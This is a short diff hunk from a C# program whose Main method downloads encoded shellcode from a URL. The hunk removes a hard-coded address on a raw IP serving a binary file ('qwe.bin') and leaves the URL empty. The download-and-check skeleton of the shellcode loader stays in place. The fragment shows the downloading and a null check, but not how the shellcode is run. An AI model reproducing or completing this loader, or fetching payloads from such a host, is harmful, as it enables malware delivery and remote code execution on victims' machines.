@@ -27,7 +27,7 @@ class Program
 
     static async Task Main()
     {
-        string url = "http://123.57.230.217/qwe.bin";  // 目标 URL
+        string url = "";  // 目标 URL
         string encodedShellcode = await DownloadShellcode(url);
 
         if (encodedShellcode != null)
